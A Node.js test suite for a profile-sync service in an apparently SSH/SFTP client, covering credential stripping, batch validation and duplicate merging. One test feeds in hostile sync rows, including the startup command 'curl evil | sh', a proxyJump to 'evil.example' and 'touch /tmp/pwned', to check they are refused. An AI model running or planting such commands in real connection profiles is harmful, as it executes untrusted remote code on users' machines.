'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function createMockStore() {
  const profiles = [];
  return {
    list: () => profiles,
    save: (profile) => {
      const idx = profiles.findIndex((p) => p.id === profile.id || (p.name === profile.name && p.host === profile.host));
      if (idx >= 0) profiles[idx] = profile;
      else profiles.push(profile);
      return profile;
    },
    _profiles: profiles
  };
}

const noopWindow = () => ({
  isDestroyed: () => false,
  webContents: { send: () => {} }
});

test('ProfileSync configure and status', () => {
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const sync = new ProfileSync(createMockStore(), noopWindow);

  // Not configured
  assert.equal(sync.getStatus().configured, false);

  // Configure
  sync.configure({ type: 'file', url: '/tmp/profiles.json', intervalMinutes: 60 });
  assert.equal(sync.getStatus().configured, true);
  assert.equal(sync.getStatus().type, 'file');

  // Disable
  sync.disable();
  assert.equal(sync.getStatus().configured, false);
});

test('ProfileSync rejects invalid config', () => {
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const sync = new ProfileSync(createMockStore(), noopWindow);

  assert.throws(() => sync.configure({ type: 'ftp' }), /Unsupported sync type/);
  assert.throws(() => sync.configure(null), /requires a type/);
  assert.throws(() => sync.configure({}), /requires a type/);
});

test('ProfileSync syncs profiles from a local file', async () => {
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aux-sync-test-'));
  try {
    const syncFile = path.join(tmpDir, 'team-profiles.json');
    const remoteProfiles = [
      { name: 'Team Web', protocol: 'ssh', group: 'Team', host: 'web.example.com', port: 22, username: 'deploy', notes: 'Shared team profile' },
      { name: 'Team DB', protocol: 'ssh', group: 'Team', host: 'db.example.com', port: 22, username: 'admin' }
    ];
    fs.writeFileSync(syncFile, JSON.stringify(remoteProfiles, null, 2));

    const store = createMockStore();
    const sync = new ProfileSync(store, noopWindow);
    sync.configure({ type: 'file', url: syncFile });

    const result = await sync.syncNow();
    assert.equal(result.added, 2, 'should have added 2 new profiles');
    assert.equal(result.total, 2);
    assert.equal(store.list().length, 2);

    // Second sync should update, not add
    const result2 = await sync.syncNow();
    assert.equal(result2.updated, 2, 'should have updated 2 existing profiles');
    assert.equal(result2.added, 0);

    assert.ok(sync.getStatus().lastSyncAt, 'lastSyncAt should be set');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('ProfileSync strips credentials during sync', async () => {
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aux-sync-test-'));
  try {
    const syncFile = path.join(tmpDir, 'creds-profiles.json');
    // Malicious remote profiles with credential IDs
    const remoteProfiles = [
      { name: 'Prod Server', protocol: 'ssh', group: 'Prod', host: 'prod.example.com', port: 22, credentialId: 'secret-123', credentialKind: 'password', password: 'hunter2' }
    ];
    fs.writeFileSync(syncFile, JSON.stringify(remoteProfiles, null, 2));

    const store = createMockStore();
    const sync = new ProfileSync(store, noopWindow);
    sync.configure({ type: 'file', url: syncFile });
    await sync.syncNow();

    const synced = store.list()[0];
    assert.equal(synced.credentialId, '', 'credentialId should be stripped');
    assert.equal(synced.credentialKind, 'password', 'credentialKind should be reset');
    assert.equal(synced.host, 'prod.example.com');
    assert.equal(synced.name, 'Prod Server');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('ProfileSync handles missing sync file gracefully', async () => {
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const sync = new ProfileSync(createMockStore(), noopWindow);
  sync.configure({ type: 'file', url: '/tmp/nonexistent-sync-file-12345.json' });

  await assert.rejects(() => sync.syncNow(), /Cannot read sync file/);
  assert.ok(sync.getStatus().lastError, 'lastError should be set');
});

test('ProfileSync preserves an existing local credential while stripping remote secret fields', async () => {
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aux-sync-preserve-'));
  try {
    const syncFile = path.join(tmpDir, 'profiles.json');
    fs.writeFileSync(syncFile, JSON.stringify([{
      name: 'Production', protocol: 'ssh', host: 'prod.example.com', port: 2332,
      credentialId: 'remote-secret', credentialKind: 'password', password: 'must-not-survive'
    }]));
    const store = createMockStore();
    store.save({
      id: 'local-production', name: 'Production', protocol: 'ssh', host: 'prod.example.com', port: 22,
      credentialId: 'local-vault-id', credentialKind: 'passphrase'
    });
    const sync = new ProfileSync(store, noopWindow);
    sync.configure({ type: 'file', path: syncFile });
    await sync.syncNow();
    const saved = store.list()[0];
    assert.equal(saved.credentialId, 'local-vault-id');
    assert.equal(saved.credentialKind, 'passphrase');
    assert.equal('password' in saved, false);
    assert.equal(saved.port, 2332);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('ProfileSync persists safe configuration and restores it after restart', () => {
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aux-sync-persist-'));
  try {
    const first = new ProfileSync(createMockStore(), noopWindow, { dataDir: tmpDir });
    first.configure({ type: 'file', path: '/tmp/team-profiles.json', intervalMinutes: 15 });
    first.stop();
    const restored = new ProfileSync(createMockStore(), noopWindow, { dataDir: tmpDir });
    assert.equal(restored.getStatus().configured, true);
    assert.equal(restored.getStatus().type, 'file');
    assert.equal(restored.getConfig().url, '/tmp/team-profiles.json');
    assert.equal(restored.getConfig().intervalMinutes, 15);
    restored.disable();
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('ProfileSync supports an SSH/SFTP profile source without sharing credentials', async () => {
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const store = createMockStore();
  store.save({ id: 'source', name: 'Sync source', protocol: 'ssh', host: 'source.example.com', credentialId: 'local-secret' });
  const calls = [];
  const sftpService = {
    readText: async (profile, remotePath, limit) => {
      calls.push({ profile, remotePath, limit });
      return JSON.stringify([{ name: 'Team host', protocol: 'ssh', host: 'team.example.com', credentialId: 'remote-secret' }]);
    }
  };
  const sync = new ProfileSync(store, noopWindow, { sftpService });
  sync.configure({ type: 'ssh', profileId: 'source', path: '/shared/profiles.json' });
  const result = await sync.syncNow();
  assert.equal(result.added, 1);
  assert.equal(calls.length, 1);
  assert.equal(calls[0].profile.id, 'source');
  assert.equal(calls[0].remotePath, '/shared/profiles.json');
  assert.equal(store.list().find((profile) => profile.name === 'Team host').credentialId, '');
  sync.stop();
});

test('ProfileSync never lets a sync source plant commands, forwarding or local shells', async () => {
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aux-sync-test-'));
  try {
    const syncFile = path.join(tmpDir, 'profiles.json');
    const store = createMockStore();
    store.save({ id: 'mine', name: 'Prod', protocol: 'ssh', host: 'prod.example.com', port: 22, startupCommand: 'tmux attach', agentForwarding: false });
    fs.writeFileSync(syncFile, JSON.stringify([
      { name: 'Prod', protocol: 'ssh', host: 'prod.example.com', port: 2222, startupCommand: 'curl evil | sh', agentForwarding: true, x11Forwarding: true, proxyJump: 'evil.example', identityFile: '/dev/zero' },
      { name: 'New', protocol: 'ssh', host: 'new.example.com', startupCommand: 'id', agentForwarding: true }
    ]));
    const sync = new ProfileSync(store, noopWindow);
    sync.configure({ type: 'file', url: syncFile });
    await sync.syncNow();
    const prod = store.list().find((p) => p.name === 'Prod');
    assert.equal(prod.port, 2222, 'shared connection details still sync');
    assert.equal(prod.startupCommand, 'tmux attach');
    assert.equal(prod.agentForwarding, false);
    assert.ok(!prod.x11Forwarding && !prod.proxyJump && !prod.identityFile);
    const added = store.list().find((p) => p.name === 'New');
    assert.ok(!added.startupCommand && !added.agentForwarding);

    fs.writeFileSync(syncFile, JSON.stringify([{ name: 'me@localhost', protocol: 'local', host: '', startupCommand: 'touch /tmp/pwned' }]));
    await assert.rejects(sync.syncNow(), /local shells are never synchronized/u);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('ProfileSync allows plain HTTP only for this computer', () => {
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const sync = new ProfileSync(createMockStore(), noopWindow);
  assert.throws(() => sync.configure({ type: 'http', url: 'http://sync.example.com/profiles.json' }), /only allowed for localhost/u);
  assert.equal(sync.configure({ type: 'http', url: 'http://127.0.0.1:8080/profiles.json' }).type, 'http');
  assert.equal(sync.configure({ type: 'https', url: 'https://sync.example.com/profiles.json' }).type, 'https');
  sync.disable();
});

test('ProfileSync refuses redirects that change the configured scheme', async () => {
  const http = require('node:http');
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const server = http.createServer((_request, response) => { response.writeHead(302, { location: 'http://sync.example.com/profiles.json' }); response.end(); });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const sync = new ProfileSync(createMockStore(), noopWindow);
  try {
    sync.configure({ type: 'http', url: `http://127.0.0.1:${server.address().port}/profiles.json` });
    await assert.rejects(sync.syncNow(), /Sync redirect refused/u);
  } finally {
    sync.disable();
    await new Promise((resolve) => server.close(resolve));
  }
});

// Real persistence is essential: the mock's name/host fallback conceals saves
// with different UUIDs for the same new row.
function createPersistedSyncFixture(t) {
  const { ProfileStore } = require('../src/main/lib/profile-store.cjs');
  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'aux-sync-batch-'));
  // The sandbox UID has no passwd entry. Keep this fixture-local.
  const userInfo = t.mock.method(os, 'userInfo', () => ({
    username: 'sync-test', homedir: directory, shell: '/bin/sh', uid: 65532, gid: 65532
  }));
  let sync;
  t.after(() => {
    sync?.stop();
    userInfo.mock.restore();
    fs.rmSync(directory, { recursive: true, force: true });
  });
  const dataDir = path.join(directory, 'data');
  const store = new ProfileStore(dataDir);
  const source = path.join(directory, 'remote.json');
  sync = new ProfileSync(store, noopWindow);
  sync.configure({ type: 'file', path: source });
  return {
    store, sync,
    writeRows: (rows) => fs.writeFileSync(source, JSON.stringify(rows)),
    bytes: () => fs.readFileSync(path.join(dataDir, 'profiles.json')),
    reopen: () => new ProfileStore(dataDir)
  };
}

const batchRow = {
  name: 'Team Web', host: 'web.example.test', protocol: 'ssh',
  port: 22, username: 'deploy', group: 'Team', notes: 'Shared host'
};
const nonLocalProfiles = (store) => store.list().filter((profile) => profile.id !== 'local-shell');

// Count policy: total is source row count (the existing public API); added and
// updated count distinct normalized identities, not redundant rows. Re-syncing
// an unchanged existing identity counts one update, as before this fix.
for (const [label, duplicate] of [
  ['identical', { ...batchRow }],
  ['trim-equivalent', { ...batchRow, name: ' Team Web ', host: ' web.example.test ', protocol: ' ssh ', username: ' deploy ', group: ' Team ', notes: ' Shared host ', port: '22' }],
  ['normalized protocol', { ...batchRow, protocol: ' SSH ' }],
  ['default protocol', { ...batchRow, protocol: undefined }]
]) {
  test(`ProfileSync coalesces ${label} new rows in real persistence and is idempotent`, async (t) => {
    const fixture = createPersistedSyncFixture(t);
    fixture.writeRows([batchRow, duplicate]);
    const firstResult = await fixture.sync.syncNow();
    const first = nonLocalProfiles(fixture.reopen());
    assert.equal(first.length, 1, 'duplicate rows must persist only one profile');
    assert.ok(first[0].id);
    assert.equal(first[0].name, batchRow.name);
    assert.equal(first[0].host, batchRow.host);
    assert.equal(first[0].protocol, 'ssh');
    assert.deepEqual(firstResult, { added: 1, updated: 0, total: 2 });

    const secondResult = await fixture.sync.syncNow();
    const second = nonLocalProfiles(fixture.reopen());
    assert.deepEqual(second.map((profile) => profile.id), [first[0].id]);
    assert.deepEqual(secondResult, { added: 0, updated: 1, total: 2 });
    // Persistence timestamps may advance, but connection data must not change.
    const { updatedAt: _firstUpdated, ...firstData } = first[0];
    const { updatedAt: _secondUpdated, ...secondData } = second[0];
    assert.deepEqual(secondData, firstData);
  });
}

for (const [field, value] of [['port', 2222], ['username', 'other-user'], ['notes', 'Different host instructions']]) {
  for (const reverse of [false, true]) {
    test(`ProfileSync rejects conflicting ${field} rows before writes (${reverse ? 'reversed' : 'forward'} order)`, async (t) => {
      const fixture = createPersistedSyncFixture(t);
      const existing = fixture.store.save({ ...batchRow, id: 'existing-web', credentialId: 'local-vault' });
      const before = fixture.bytes();
      const beforeProfiles = fixture.reopen().list();
      // Observe the real save method, rather than replacing persistence.
      const saves = t.mock.method(fixture.store, 'save');
      const conflicts = [batchRow, { ...batchRow, name: ' Team Web ', host: ' web.example.test ', [field]: value }];
      if (reverse) conflicts.reverse();
      fixture.writeRows([
        { name: 'Earlier valid new row', host: 'earlier.example.test', protocol: 'ssh' },
        ...conflicts
      ]);
      await assert.rejects(fixture.sync.syncNow(), /conflict/i);
      assert.equal(saves.mock.callCount(), 0, 'validate the entire batch before saving');
      assert.deepEqual(fixture.bytes(), before, 'profiles.json must be byte-for-byte unchanged');
      assert.deepEqual(fixture.reopen().list(), beforeProfiles);
      assert.equal(fixture.store.get(existing.id).credentialId, 'local-vault');
    });
  }
}

test('ProfileSync rejects conflicting new identities without writing an earlier valid update', async (t) => {
  const fixture = createPersistedSyncFixture(t);
  fixture.store.save({ name: 'Existing', host: 'existing.example.test', protocol: 'ssh', port: 22 });
  const before = fixture.bytes();
  const saves = t.mock.method(fixture.store, 'save');
  fixture.writeRows([
    { name: 'Existing', host: 'existing.example.test', protocol: 'ssh', port: 2222 },
    batchRow, { ...batchRow, port: 2200 }
  ]);
  await assert.rejects(fixture.sync.syncNow(), /conflict/i);
  assert.equal(saves.mock.callCount(), 0);
  assert.deepEqual(fixture.bytes(), before);
  assert.equal(nonLocalProfiles(fixture.reopen()).length, 1);
});

for (const invalid of [null, { ...batchRow, name: 'Invalid', port: 70000 }, { ...batchRow, name: 'Invalid', host: '' }]) {
  test(`ProfileSync validates later invalid rows before any real-store writes (${invalid === null ? 'null' : invalid.host ? 'port' : 'host'})`, async (t) => {
    const fixture = createPersistedSyncFixture(t);
    fixture.store.save({ ...batchRow, id: 'existing-web' });
    const before = fixture.bytes();
    const beforeProfiles = fixture.reopen().list();
    const saves = t.mock.method(fixture.store, 'save');
    fixture.writeRows([
      { ...batchRow, port: 2222 },
      { name: 'Valid new row', host: 'new.example.test', protocol: 'ssh' },
      invalid
    ]);
    await assert.rejects(fixture.sync.syncNow(), /invalid|must be an object/i);
    assert.equal(saves.mock.callCount(), 0);
    assert.deepEqual(fixture.bytes(), before);
    assert.deepEqual(fixture.reopen().list(), beforeProfiles);
  });
}

const localSyncFields = {
  startupCommand: 'tmux attach', proxyJump: 'bastion.example.test',
  identityFile: '/tmp/local-key', knownHostsFile: '/tmp/local-known-hosts',
  agentForwarding: true, x11Forwarding: true, useSshConfig: false,
  sshAlias: 'local-alias', trackRemoteCwd: true
};

test('ProfileSync duplicate updates retain real-store IDs, credentials and all local-only settings', async (t) => {
  const fixture = createPersistedSyncFixture(t);
  const existing = fixture.store.save({
    ...batchRow, ...localSyncFields, id: 'local-web',
    credentialId: 'local-vault', credentialKind: 'passphrase'
  });
  const remote = {
    ...batchRow, port: 2222, id: 'remote-id', credentialId: 'remote-vault', credentialKind: 'password',
    password: 'remote-password', passphrase: 'remote-passphrase', secret: 'remote-secret', privateKey: 'remote-private-key',
    startupCommand: 'untrusted command', proxyJump: 'untrusted.test', identityFile: '/tmp/untrusted-key',
    knownHostsFile: '/tmp/untrusted-hosts', agentForwarding: false, x11Forwarding: false,
    useSshConfig: true, sshAlias: 'untrusted', trackRemoteCwd: false
  };
  fixture.writeRows([remote, { ...remote, name: ' Team Web ', host: ' web.example.test ', protocol: ' SSH ' }]);
  const result = await fixture.sync.syncNow();
  const profiles = nonLocalProfiles(fixture.reopen());
  assert.equal(profiles.length, 1);
  const saved = profiles[0];
  assert.equal(saved.id, existing.id);
  assert.equal(saved.createdAt, existing.createdAt);
  assert.equal(saved.port, 2222);
  assert.equal(saved.credentialId, 'local-vault');
  assert.equal(saved.credentialKind, 'passphrase');
  for (const [field, value] of Object.entries(localSyncFields)) assert.equal(saved[field], value, field);
  for (const field of ['password', 'passphrase', 'secret', 'privateKey']) {
    assert.equal(Object.hasOwn(saved, field), false, field);
    assert.equal(fixture.bytes().toString().includes(remote[field]), false, `${field} must not reach disk`);
  }
  assert.deepEqual(result, { added: 0, updated: 1, total: 2 });
});

test('ProfileSync keeps different protocols distinct when staging and matching persisted profiles', async (t) => {
  const fixture = createPersistedSyncFixture(t);
  const rows = ['ssh', 'ftp', 'ftps'].map((protocol) => ({ name: 'Shared', host: 'shared.example.test', protocol }));
  fixture.writeRows(rows.flatMap((row) => [row, { ...row }]));
  const firstResult = await fixture.sync.syncNow();
  const first = nonLocalProfiles(fixture.reopen());
  assert.equal(first.length, 3);
  assert.equal(new Set(first.map((profile) => profile.id)).size, 3);
  assert.deepEqual(first.map((profile) => profile.protocol).sort(), ['ftp', 'ftps', 'ssh']);
  assert.deepEqual(firstResult, { added: 3, updated: 0, total: 6 });
  assert.deepEqual(await fixture.sync.syncNow(), { added: 0, updated: 3, total: 6 });
  assert.deepEqual(nonLocalProfiles(fixture.reopen()).map((profile) => [profile.id, profile.protocol]), first.map((profile) => [profile.id, profile.protocol]));
});

test('ProfileSync never deletes pre-existing duplicate records while coalescing remote rows', async (t) => {
  const fixture = createPersistedSyncFixture(t);
  const originals = ['first-copy', 'second-copy'].map((id) => fixture.store.save({
    ...batchRow, id, credentialId: `vault-${id}`, startupCommand: `echo ${id}`
  }));
  assert.equal(nonLocalProfiles(fixture.reopen()).length, 2, 'fixture must contain real duplicate identities');
  fixture.writeRows([batchRow, { ...batchRow }]);
  const result = await fixture.sync.syncNow();
  const reopened = fixture.reopen();
  assert.deepEqual(nonLocalProfiles(reopened).map((profile) => profile.id).sort(), originals.map((profile) => profile.id).sort());
  for (const original of originals) {
    const saved = reopened.get(original.id);
    assert.equal(saved.credentialId, original.credentialId);
    assert.equal(saved.startupCommand, original.startupCommand);
  }
  assert.deepEqual(result, { added: 0, updated: 1, total: 2 });
});
